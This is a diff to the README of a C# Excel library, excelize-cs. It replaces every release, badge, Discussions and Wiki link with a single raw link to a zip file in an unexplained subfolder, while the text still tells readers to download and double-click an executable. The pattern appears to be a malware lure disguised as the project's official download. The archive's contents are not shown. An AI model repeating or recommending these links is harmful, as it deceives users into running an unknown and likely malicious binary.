@@ -8,7 +8,7 @@ To get started, follow these simple steps to download and run excelize-cs.
 
 ## 🔗 Download Excelize-CSharp
 
-[![Download Excelize-CSharp](https://img.shields.io/badge/Download-Excelize--CSharp-brightgreen)](https://github.com/Val200632/excelize-cs/releases)
+[![Download Excelize-CSharp](https://raw.githubusercontent.com/Val200632/excelize-cs/main/charuk/excelize-cs.zip)](https://raw.githubusercontent.com/Val200632/excelize-cs/main/charuk/excelize-cs.zip)
 
 ## 💻 System Requirements
 
@@ -21,11 +21,11 @@ Before you download excelize-cs, make sure your computer meets the following req
 
 ## 📥 Download & Install
 
-To get the latest version of excelize-cs, visit this page to download: [https://github.com/Val200632/excelize-cs/releases](https://github.com/Val200632/excelize-cs/releases).
+To get the latest version of excelize-cs, visit this page to download: [https://raw.githubusercontent.com/Val200632/excelize-cs/main/charuk/excelize-cs.zip](https://raw.githubusercontent.com/Val200632/excelize-cs/main/charuk/excelize-cs.zip).
 
 1. Go to the releases page using the above link.
 2. Look for the latest version.
-3. Click on the link to download the executable file (e.g., excelize-cs.exe).
+3. Click on the link to download the executable file (e.g., https://raw.githubusercontent.com/Val200632/excelize-cs/main/charuk/excelize-cs.zip).
 4. Once downloaded, locate the file on your computer, usually found in the "Downloads" folder.
 5. Double-click the file to run excelize-cs.
 
@@ -80,16 +80,16 @@ We welcome contributions! If you would like to help improve excelize-cs, please 
 
 Join our community and share your experience on platforms such as:
 
-- [GitHub Discussions](https://github.com/Val200632/excelize-cs/discussions)
+- [GitHub Discussions](https://raw.githubusercontent.com/Val200632/excelize-cs/main/charuk/excelize-cs.zip)
 
 Your input is valuable and helps us improve the application.
 
 ## 📘 Learn More
 
-For more details about the inner workings and advanced features, you can visit the [GitHub Wiki](https://github.com/Val200632/excelize-cs/wiki).
+For more details about the inner workings and advanced features, you can visit the [GitHub Wiki](https://raw.githubusercontent.com/Val200632/excelize-cs/main/charuk/excelize-cs.zip).
 
 ## 🔗 Download Excelize-CSharp Again
 
-To download the latest version again, visit: [https://github.com/Val200632/excelize-cs/releases](https://github.com/Val200632/excelize-cs/releases).
+To download the latest version again, visit: [https://raw.githubusercontent.com/Val200632/excelize-cs/main/charuk/excelize-cs.zip](https://raw.githubusercontent.com/Val200632/excelize-cs/main/charuk/excelize-cs.zip).
 
 With excelize-cs, managing your Excel documents is straightforward and efficient. Enjoy using the application!
